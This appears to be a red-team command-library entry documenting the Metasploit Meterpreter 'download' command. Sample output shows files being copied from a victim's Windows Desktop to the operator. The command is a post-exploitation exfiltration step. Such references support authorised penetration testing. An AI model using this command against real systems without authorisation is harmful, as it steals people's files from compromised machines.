---
id: cafb400c-0110-4fd8-93f8-2e641ad14c5c
name: Metasploit Download a File or Directory
type: command
executor: metasploit
data: download "$_TARGET"
output: 'meterpreter > download "C:\Users\Victim\Desktop"

  [*] downloading: C:\Users\Victim\Desktop\010 Editor.lnk -> Desktop/010 Editor.lnk

  [*] download   : C:\Users\Victim\Desktop\010 Editor.lnk -> Desktop/010 Editor.lnk

  [*] downloading: C:\Users\Victim\Desktop\cutter - Shortcut.lnk -> Desktop/cutter
  - Shortcut.lnk

  [*] download   : C:\Users\Victim\Desktop\cutter - Shortcut.lnk -> Desktop/cutter
  - Shortcut.lnk

  [*] downloading: C:\Users\Victim\Desktop\desktop.ini -> Desktop/desktop.ini

  [*] download   : C:\Users\Victim\Desktop\desktop.ini -> Desktop/desktop.ini'
created_at: '2020-07-08T23:57:32.896698+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Metasploit Download a File or Directory

```metasploit
download "$_TARGET"
```

## Expected Output

```
meterpreter > download "C:\Users\Victim\Desktop"
[*] downloading: C:\Users\Victim\Desktop\010 Editor.lnk -> Desktop/010 Editor.lnk
[*] download   : C:\Users\Victim\Desktop\010 Editor.lnk -> Desktop/010 Editor.lnk
[*] downloading: C:\Users\Victim\Desktop\cutter - Shortcut.lnk -> Desktop/cutter - Shortcut.lnk
[*] download   : C:\Users\Victim\Desktop\cutter - Shortcut.lnk -> Desktop/cutter - Shortcut.lnk
[*] downloading: C:\Users\Victim\Desktop\desktop.ini -> Desktop/desktop.ini
[*] download   : C:\Users\Victim\Desktop\desktop.ini -> Desktop/desktop.ini
```
